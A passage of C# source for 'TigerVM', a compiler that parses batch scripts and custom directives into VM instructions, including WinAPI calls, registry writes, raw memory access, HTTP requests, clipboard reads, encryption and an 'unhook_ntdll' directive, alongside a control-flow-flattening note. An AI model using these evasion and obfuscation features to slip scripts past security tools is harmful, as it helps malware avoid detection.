            HudSpinner = 53,
            VfsList = 54,
            RegRead = 55,
            RegWrite = 56,
            MemAlloc = 57,
            MemFree = 58,
            MemWriteStr = 59,
            MemReadStr = 60,
            SysInfo = 61,
            NetPing = 62,
            VfsUnzip = 63
        }

        public class VmInstruction
        {
            public VmOpcode Op;
            public string Arg1;
            public string Arg2;
            public string Arg3;
            public string Arg4;
            public bool Flag1;
            public bool Flag2;
            public int IntVal;
            public int StateId; // For Control Flow Flattening
            public int NextStateId;
        }

        public static List<VmInstruction> OptimizeAst(List<VmInstruction> instrs)
        {
            if (instrs == null) return new List<VmInstruction>();
            List<VmInstruction> opt = new List<VmInstruction>();
            bool unreachable = false;

            foreach (var inst in instrs)
            {
                if (inst.Op == VmOpcode.Label)
                {
                    unreachable = false;
                    opt.Add(inst);
                    continue;
                }

                if (unreachable) continue;

                if (inst.Op == VmOpcode.SetMath)
                {
                    string expr = (inst.Arg2 ?? "").Trim();
                    if (Regex.IsMatch(expr, @"^[0-9\s\+\-\*\/\^\%\&\|\(\)]+$"))
                    {
                        try
                        {
                            var dt = new System.Data.DataTable();
                            var res = dt.Compute(expr, "");
                            inst.Arg2 = Convert.ToInt64(res).ToString();
                        }
                        catch { }
                    }
                    opt.Add(inst);
                }
                else if (inst.Op == VmOpcode.Nop)
                {
                    continue;
                }
                else
                {
                    opt.Add(inst);
                }

                if (inst.Op == VmOpcode.Goto || inst.Op == VmOpcode.Exit)
                {
                    unreachable = true;
                }
            }
            return opt;
        }

        public static List<VmInstruction> ParseBatchToTigerVm(string scriptContent)
        {
            List<VmInstruction> instrs = new List<VmInstruction>();
            string[] rawLines = scriptContent.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            List<string> lines = new List<string>();

            // Multi-line block accumulator for parentheses
            for (int i = 0; i < rawLines.Length; i++)
            {
                string cur = rawLines[i];
                string trimmed = cur.Trim();
                if (trimmed.StartsWith("for ", StringComparison.OrdinalIgnoreCase) || trimmed.StartsWith("if ", StringComparison.OrdinalIgnoreCase))
                {
                    int openCount = 0;
                    foreach (char c in cur) { if (c == '(') openCount++; else if (c == ')') openCount--; }
                    while (openCount > 0 && i + 1 < rawLines.Length)
                    {
                        i++;
                        string nextLine = rawLines[i].Trim();
                        cur += " & " + nextLine;
                        foreach (char c in rawLines[i]) { if (c == '(') openCount++; else if (c == ')') openCount--; }
                    }
                }
                lines.Add(cur);
            }

            for (int lineIdx = 0; lineIdx < lines.Count; lineIdx++)
            {
                string rawLine = lines[lineIdx];
                string trimmed = rawLine.Trim();

                if (string.IsNullOrEmpty(trimmed)) continue;

                // TigerVM Extended Directives (::@ or rem @ or @@)
                if (trimmed.StartsWith("::@") || trimmed.StartsWith("rem @", StringComparison.OrdinalIgnoreCase) || trimmed.StartsWith("@@"))
                {
                    string dirLine = trimmed.StartsWith("::@") ? trimmed.Substring(3).Trim() : (trimmed.StartsWith("rem @", StringComparison.OrdinalIgnoreCase) ? trimmed.Substring(5).Trim() : trimmed.Substring(2).Trim());

                    if (dirLine.StartsWith("winapi ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("api ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string dllName = parts.Length > 1 ? parts[1] : "";
                        string rest = parts.Length > 2 ? parts[2] : "";
                        string[] funcParts = rest.Split(new[] { ' ' }, 2);
                        string funcName = funcParts.Length > 0 ? funcParts[0] : "";
                        string apiArgs = funcParts.Length > 1 ? funcParts[1] : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.WinApi, Arg1 = dllName, Arg2 = funcName, Arg3 = apiArgs });
                        continue;
                    }

                    if (dirLine.StartsWith("thread ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("async ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 2);
                        string tLabel = parts.Length > 1 ? parts[1].Trim().TrimStart(':').ToLowerInvariant() : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.ThreadStart, Arg1 = tLabel });
                        continue;
                    }

                    if (dirLine.Equals("thread_wait", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("sync", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("threadwait", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.ThreadWait });
                        continue;
                    }

                    if (dirLine.StartsWith("vfs_read ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("vfsread ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string vFile = parts.Length > 1 ? parts[1] : "";
                        string vDest = parts.Length > 2 ? parts[2] : "VFS_OUT";
                        instrs.Add(new VmInstruction { Op = VmOpcode.VfsRead, Arg1 = vFile, Arg2 = vDest });
                        continue;
                    }

                    if (dirLine.StartsWith("vfs_write ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("vfswrite ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string vFile = parts.Length > 1 ? parts[1] : "";
                        string vContent = parts.Length > 2 ? parts[2] : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.VfsWrite, Arg1 = vFile, Arg2 = vContent });
                        continue;
                    }

                    if (dirLine.StartsWith("hud ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("banner ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string hText = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        string[] parts = hText.Split(new[] { '|' }, 2);
                        string tMain = parts[0].Trim().Trim('\"');
                        string tSub = parts.Length > 1 ? parts[1].Trim().Trim('\"') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.HudBanner, Arg1 = tMain, Arg2 = tSub });
                        continue;
                    }

                    if (dirLine.StartsWith("progress ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string pRest = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        string[] parts = pRest.Split(new[] { ' ' }, 2);
                        string pct = parts.Length > 0 ? parts[0].Trim() : "50";
                        string lbl = parts.Length > 1 ? parts[1].Trim().Trim('\"') : "Processing...";
                        instrs.Add(new VmInstruction { Op = VmOpcode.HudProgress, Arg1 = pct, Arg2 = lbl });
                        continue;
                    }

                    if (dirLine.StartsWith("matrix", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] mParts = dirLine.Split(new[] { ' ' }, 2);
                        int lCnt = 25;
                        if (mParts.Length > 1) int.TryParse(mParts[1], out lCnt);
                        instrs.Add(new VmInstruction { Op = VmOpcode.HudMatrix, IntVal = lCnt });
                        continue;
                    }

                    if (dirLine.Equals("unhook", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("unhook_ntdll", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.MemUnhook });
                        continue;
                    }

                    if (dirLine.StartsWith("msgbox ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("gui_msgbox ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("alert ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string pText = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        string[] parts = pText.Split('|');
                        string mTitle = parts.Length > 0 ? parts[0].Trim().Trim('\"', '\'') : "TigerVM Notice";
                        string mBody = parts.Length > 1 ? parts[1].Trim().Trim('\"', '\'') : "";
                        string mBtn = parts.Length > 2 ? parts[2].Trim().Trim('\"', '\'') : "OK";
                        string mIcon = parts.Length > 3 ? parts[3].Trim().Trim('\"', '\'') : "Info";
                        string mRes = parts.Length > 4 ? parts[4].Trim().Trim('\"', '\'') : "MSGBOX_RESULT";
                        instrs.Add(new VmInstruction { Op = VmOpcode.GuiMsgBox, Arg1 = mTitle, Arg2 = mBody, Arg3 = mBtn + "|" + mIcon, Arg4 = mRes });
                        continue;
                    }

                    if (dirLine.StartsWith("inputbox ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("gui_input ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string pRest = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        var matches = Regex.Matches(pRest, @"""[^""]*""|[^\s]+");
                        List<string> tokens = new List<string>();
                        foreach (Match m in matches) tokens.Add(m.Value.Trim('\"', '\''));
                        string vName = tokens.Count > 0 ? tokens[0] : "INPUT_RESULT";
                        string prompt = tokens.Count > 1 ? tokens[1] : "Enter input:";
                        string defTxt = tokens.Count > 2 ? tokens[2] : "";
                        string title = tokens.Count > 3 ? tokens[3] : "TigerVM Input";
                        instrs.Add(new VmInstruction { Op = VmOpcode.GuiInputBox, Arg1 = vName, Arg2 = prompt, Arg3 = defTxt, Arg4 = title });
                        continue;
                    }

                    if (dirLine.StartsWith("filedialog ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("gui_file ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string pRest = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        var matches = Regex.Matches(pRest, @"""[^""]*""|[^\s]+");
                        List<string> tokens = new List<string>();
                        foreach (Match m in matches) tokens.Add(m.Value.Trim('\"', '\''));
                        string vName = tokens.Count > 0 ? tokens[0] : "FILE_RESULT";
                        string title = tokens.Count > 1 ? tokens[1] : "Select File";
                        string filt = tokens.Count > 2 ? tokens[2] : "All Files (*.*)|*.*";
                        string mode = tokens.Count > 3 ? tokens[3] : "open";
                        instrs.Add(new VmInstruction { Op = VmOpcode.GuiFileDialog, Arg1 = vName, Arg2 = title, Arg3 = filt, Arg4 = mode });
                        continue;
                    }

                    if (dirLine.StartsWith("http_get ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("get ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
                        string vName = parts.Length > 1 ? parts[1] : "HTTP_RESPONSE";
                        string url = parts.Length > 2 ? parts[2] : "";
                        int timeout = 10000;
                        if (parts.Length > 3) int.TryParse(parts[3], out timeout);
                        instrs.Add(new VmInstruction { Op = VmOpcode.HttpGet, Arg1 = vName, Arg2 = url, IntVal = timeout });
                        continue;
                    }

                    if (dirLine.StartsWith("http_post ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("post ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 5);
                        string vName = parts.Length > 1 ? parts[1] : "HTTP_RESPONSE";
                        string url = parts.Length > 2 ? parts[2] : "";
                        string payload = parts.Length > 3 ? parts[3] : "";
                        string cType = parts.Length > 4 ? parts[4] : "application/json";
                        instrs.Add(new VmInstruction { Op = VmOpcode.HttpPost, Arg1 = vName, Arg2 = url, Arg3 = payload, Arg4 = cType, IntVal = 10000 });
                        continue;
                    }

                    if (dirLine.StartsWith("notify ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("toast ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string pText = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        string[] parts = pText.Split('|');
                        string nTitle = parts.Length > 0 ? parts[0].Trim().Trim('\"', '\'') : "TigerVM Notification";
                        string nMsg = parts.Length > 1 ? parts[1].Trim().Trim('\"', '\'') : "";
                        int nSec = 5;
                        if (parts.Length > 2) int.TryParse(parts[2].Trim(), out nSec);
                        string nIcon = parts.Length > 3 ? parts[3].Trim().Trim('\"', '\'') : "Info";
                        instrs.Add(new VmInstruction { Op = VmOpcode.Notify, Arg1 = nTitle, Arg2 = nMsg, Arg3 = nIcon, IntVal = nSec });
                        continue;
                    }

                    if (dirLine.StartsWith("json_get ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("json ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
                        string destVar = parts.Length > 1 ? parts[1] : "JSON_VAL";
                        string jsonSrc = parts.Length > 2 ? parts[2] : "{}";
                        string jsonPath = parts.Length > 3 ? parts[3].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.JsonGet, Arg1 = destVar, Arg2 = jsonSrc, Arg3 = jsonPath });
                        continue;
                    }

                    if (dirLine.StartsWith("json_set ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 5);
                        string destVar = parts.Length > 1 ? parts[1] : "JSON_VAL";
                        string jsonSrc = parts.Length > 2 ? parts[2] : "{}";
                        string jsonPath = parts.Length > 3 ? parts[3].Trim('\"', '\'') : "";
                        string newVal = parts.Length > 4 ? parts[4].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.JsonSet, Arg1 = destVar, Arg2 = jsonSrc, Arg3 = jsonPath, Arg4 = newVal });
                        continue;
                    }

                    if (dirLine.StartsWith("sql_exec ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("sql ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string q = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim().Trim('\"') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.SqlExec, Arg1 = q });
                        continue;
                    }

                    if (dirLine.StartsWith("sql_query ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "SQL_RESULT";
                        string q = parts.Length > 2 ? parts[2].Trim('\"') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.SqlQuery, Arg1 = destVar, Arg2 = q });
                        continue;
                    }

                    if (dirLine.StartsWith("clip_get ", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("clip_get", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 2);
                        string destVar = parts.Length > 1 ? parts[1] : "CLIP_TEXT";
                        instrs.Add(new VmInstruction { Op = VmOpcode.ClipGet, Arg1 = destVar });
                        continue;
                    }

                    if (dirLine.StartsWith("clip_set ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string txt = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim().Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.ClipSet, Arg1 = txt });
                        continue;
                    }

                    if (dirLine.StartsWith("crypto_encrypt ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("aes_encrypt ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
                        string destVar = parts.Length > 1 ? parts[1] : "CIPHER_TEXT";
                        string plain = parts.Length > 2 ? parts[2] : "";
                        string pass = parts.Length > 3 ? parts[3].Trim('\"', '\'') : "TigerSecretKey";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoAes, Arg1 = destVar, Arg2 = plain, Arg3 = pass, Arg4 = "ENC" });
                        continue;
                    }

                    if (dirLine.StartsWith("crypto_decrypt ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("aes_decrypt ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
                        string destVar = parts.Length > 1 ? parts[1] : "PLAIN_TEXT";
                        string cipher = parts.Length > 2 ? parts[2] : "";
                        string pass = parts.Length > 3 ? parts[3].Trim('\"', '\'') : "TigerSecretKey";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoAes, Arg1 = destVar, Arg2 = cipher, Arg3 = pass, Arg4 = "DEC" });
                        continue;
                    }

                    if (dirLine.StartsWith("crypto_sha256 ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("sha256 ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "HASH_VAL";
                        string txt = parts.Length > 2 ? parts[2].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoHash, Arg1 = destVar, Arg2 = txt, Arg3 = "SHA256" });
                        continue;
                    }

                    if (dirLine.StartsWith("crypto_md5 ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("md5 ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "HASH_VAL";
                        string txt = parts.Length > 2 ? parts[2].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoHash, Arg1 = destVar, Arg2 = txt, Arg3 = "MD5" });
                        continue;
                    }

                    if (dirLine.StartsWith("b64_encode ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("base64_encode ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "B64_VAL";
                        string txt = parts.Length > 2 ? parts[2].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoHash, Arg1 = destVar, Arg2 = txt, Arg3 = "B64_ENC" });
                        continue;
                    }

                    if (dirLine.StartsWith("b64_decode ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("base64_decode ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "B64_VAL";
                        string txt = parts.Length > 2 ? parts[2].Trim('\"', '\'') : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.CryptoHash, Arg1 = destVar, Arg2 = txt, Arg3 = "B64_DEC" });
                        continue;
                    }

                    if (dirLine.Equals("try", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("try ", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.TryStart });
                        continue;
                    }

                    if (dirLine.StartsWith("catch ", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("catch", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 2);
                        string errVar = parts.Length > 1 ? parts[1].Trim() : "ERROR_MSG";
                        instrs.Add(new VmInstruction { Op = VmOpcode.Catch, Arg1 = errVar });
                        continue;
                    }

                    if (dirLine.Equals("end_try", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("endtry", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("finally", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.EndTry });
                        continue;
                    }

                    if (dirLine.StartsWith("hud_table ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("table ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string tData = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.HudTable, Arg1 = tData });
                        continue;
                    }

                    if (dirLine.StartsWith("hud_spinner ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("spinner ", StringComparison.OrdinalIgnoreCase))
                    {
                        int spIdx = dirLine.IndexOf(' ');
                        string sRest = spIdx != -1 ? dirLine.Substring(spIdx + 1).Trim() : "";
                        string[] parts = sRest.Split(new[] { ' ' }, 2);
                        string sMs = parts.Length > 0 ? parts[0].Trim() : "1000";
                        string sLbl = parts.Length > 1 ? parts[1].Trim().Trim('\"', '\'') : "Processing...";
                        instrs.Add(new VmInstruction { Op = VmOpcode.HudSpinner, Arg1 = sMs, Arg2 = sLbl });
                        continue;
                    }

                    if (dirLine.StartsWith("vfs_list ", StringComparison.OrdinalIgnoreCase) || dirLine.Equals("vfs_list", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 2);
                        string vDest = parts.Length > 1 ? parts[1].Trim() : "VFS_LIST";
                        instrs.Add(new VmInstruction { Op = VmOpcode.VfsList, Arg1 = vDest });
                        continue;
                    }

                    if (dirLine.StartsWith("reg_read ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("regread ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 5);
                        string destVar = parts.Length > 1 ? parts[1] : "REG_VAL";
                        string hive = parts.Length > 2 ? parts[2] : "HKCU";
                        string keyPath = parts.Length > 3 ? parts[3] : "";
                        string valName = parts.Length > 4 ? parts[4] : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.RegRead, Arg1 = destVar, Arg2 = hive, Arg3 = keyPath, Arg4 = valName });
                        continue;
                    }

                    if (dirLine.StartsWith("reg_write ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("regwrite ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 6);
                        string hive = parts.Length > 1 ? parts[1] : "HKCU";
                        string keyPath = parts.Length > 2 ? parts[2] : "";
                        string valName = parts.Length > 3 ? parts[3] : "";
                        string valData = parts.Length > 4 ? parts[4] : "";
                        string valType = parts.Length > 5 ? parts[5] : "SZ";
                        instrs.Add(new VmInstruction { Op = VmOpcode.RegWrite, Arg1 = hive, Arg2 = keyPath, Arg3 = valName, Arg4 = valData + "|" + valType });
                        continue;
                    }

                    if (dirLine.StartsWith("mem_alloc ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("memalloc ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "PTR_VAL";
                        string sizeStr = parts.Length > 2 ? parts[2] : "1024";
                        instrs.Add(new VmInstruction { Op = VmOpcode.MemAlloc, Arg1 = destVar, Arg2 = sizeStr });
                        continue;
                    }

                    if (dirLine.StartsWith("mem_free ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("memfree ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 2);
                        string ptrVar = parts.Length > 1 ? parts[1] : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.MemFree, Arg1 = ptrVar });
                        continue;
                    }

                    if (dirLine.StartsWith("mem_write ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("memwrite ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string ptrVar = parts.Length > 1 ? parts[1] : "";
                        string txt = parts.Length > 2 ? parts[2] : "";
                        instrs.Add(new VmInstruction { Op = VmOpcode.MemWriteStr, Arg1 = ptrVar, Arg2 = txt });
                        continue;
                    }

                    if (dirLine.StartsWith("mem_read ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("memread ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
                        string destVar = parts.Length > 1 ? parts[1] : "MEM_TEXT";
                        string ptrVar = parts.Length > 2 ? parts[2] : "";
                        string lenStr = parts.Length > 3 ? parts[3] : "256";
                        instrs.Add(new VmInstruction { Op = VmOpcode.MemReadStr, Arg1 = destVar, Arg2 = ptrVar, Arg3 = lenStr });
                        continue;
                    }

                    if (dirLine.StartsWith("sys_info ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("sysinfo ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string destVar = parts.Length > 1 ? parts[1] : "SYS_INFO";
                        string prop = parts.Length > 2 ? parts[2].Trim('\"', '\'') : "CPU_COUNT";
                        instrs.Add(new VmInstruction { Op = VmOpcode.SysInfo, Arg1 = destVar, Arg2 = prop });
                        continue;
                    }

                    if (dirLine.StartsWith("net_ping ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("netping ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("net_port ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 5);
                        string destVar = parts.Length > 1 ? parts[1] : "PING_RESULT";
                        string host = parts.Length > 2 ? parts[2] : "127.0.0.1";
                        string port = parts.Length > 3 ? parts[3] : "80";
                        string timeout = parts.Length > 4 ? parts[4] : "2000";
                        instrs.Add(new VmInstruction { Op = VmOpcode.NetPing, Arg1 = destVar, Arg2 = host, Arg3 = port, Arg4 = timeout });
                        continue;
                    }

                    if (dirLine.StartsWith("vfs_unzip ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("vfsunzip ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
                        string zipSrc = parts.Length > 1 ? parts[1] : "";
                        string vfsPrefix = parts.Length > 2 ? parts[2] : "VFS:\\";
                        instrs.Add(new VmInstruction { Op = VmOpcode.VfsUnzip, Arg1 = zipSrc, Arg2 = vfsPrefix });
                        continue;
                    }
                }

                if (trimmed.StartsWith("::") || trimmed.StartsWith("rem ", StringComparison.OrdinalIgnoreCase) || trimmed.Equals("rem", StringComparison.OrdinalIgnoreCase))
                    continue;

                // Handle @echo off / on
                if (trimmed.StartsWith("@echo", StringComparison.OrdinalIgnoreCase) || trimmed.StartsWith("echo", StringComparison.OrdinalIgnoreCase))
                {
                    string echoCmd = trimmed.StartsWith("@") ? trimmed.Substring(1).Trim() : trimmed;
                    if (echoCmd.Equals("echo off", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.EchoToggle, Flag1 = false });
                        continue;
                    }
                    if (echoCmd.Equals("echo on", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.EchoToggle, Flag1 = true });
                        continue;
                    }
                    if (echoCmd.Equals("echo.", StringComparison.OrdinalIgnoreCase) || echoCmd.Equals("echo/", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.Echo, Arg1 = "" });
                        continue;
                    }
                    if (echoCmd.StartsWith("echo ", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.Echo, Arg1 = echoCmd.Substring(5) });
                        continue;
                    }
                    if (echoCmd.Equals("echo", StringComparison.OrdinalIgnoreCase))
                    {
                        instrs.Add(new VmInstruction { Op = VmOpcode.Echo, Arg1 = "" });
                        continue;
                    }
                }

                string workLine = trimmed.StartsWith("@") ? trimmed.Substring(1).Trim() : trimmed;

                // FOR Loops
                if (workLine.StartsWith("for ", StringComparison.OrdinalIgnoreCase))
                {
                    if (TryParseForLoop(workLine, instrs)) continue;
                }

                // Label
                if (workLine.StartsWith(":") && !workLine.StartsWith("::"))
                {
                    string labelName = workLine.Substring(1).Trim().ToLowerInvariant();
                    instrs.Add(new VmInstruction { Op = VmOpcode.Label, Arg1 = labelName });
                    continue;
                }

                // Goto
                if (workLine.StartsWith("goto ", StringComparison.OrdinalIgnoreCase))
                {
                    string target = workLine.Substring(5).Trim().TrimStart(':').ToLowerInvariant();
                    instrs.Add(new VmInstruction { Op = VmOpcode.Goto, Arg1 = target });
                    continue;
                }

                // Call subroutine (:label)
                if (workLine.StartsWith("call :", StringComparison.OrdinalIgnoreCase))
                {
                    string sub = workLine.Substring(6).Trim().ToLowerInvariant();
                    string[] subParts = sub.Split(new[] { ' ' }, 2);
                    string targetLabel = subParts[0].Trim();
                    string subArgs = subParts.Length > 1 ? subParts[1].Trim() : "";
                    instrs.Add(new VmInstruction { Op = VmOpcode.CallSub, Arg1 = targetLabel, Arg2 = subArgs });
                    continue;
                }

                // Pause
                if (workLine.Equals("pause", StringComparison.OrdinalIgnoreCase) || workLine.StartsWith("pause ", StringComparison.OrdinalIgnoreCase))
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.Pause });
                    continue;
                }

                // Cls
                if (workLine.Equals("cls", StringComparison.OrdinalIgnoreCase))
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.Cls });
                    continue;
                }

                // Title
                if (workLine.StartsWith("title ", StringComparison.OrdinalIgnoreCase))
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.Title, Arg1 = workLine.Substring(6).Trim() });
                    continue;
                }

                // Color
                if (workLine.StartsWith("color ", StringComparison.OrdinalIgnoreCase))
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.Color, Arg1 = workLine.Substring(6).Trim() });
                    continue;
                }

                // CD / CHDIR
                if (workLine.StartsWith("cd ", StringComparison.OrdinalIgnoreCase) || workLine.StartsWith("chdir ", StringComparison.OrdinalIgnoreCase))
                {
                    int spaceIdx = workLine.IndexOf(' ');
                    string pathArg = workLine.Substring(spaceIdx + 1).Trim().Trim('"', '\'');
                    if (pathArg.StartsWith("/d ", StringComparison.OrdinalIgnoreCase)) pathArg = pathArg.Substring(3).Trim().Trim('"', '\'');
                    instrs.Add(new VmInstruction { Op = VmOpcode.Cd, Arg1 = pathArg });
                    continue;
                }

                // Timeout / Delay
                if (workLine.StartsWith("timeout ", StringComparison.OrdinalIgnoreCase))
                {
                    Match m = Regex.Match(workLine, @"timeout\s+(?:/t\s+)?(\d+)", RegexOptions.IgnoreCase);
                    int sec = m.Success ? int.Parse(m.Groups[1].Value) : 1;
                    instrs.Add(new VmInstruction { Op = VmOpcode.Delay, IntVal = sec * 1000 });
                    continue;
                }

                // Exit
                if (workLine.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
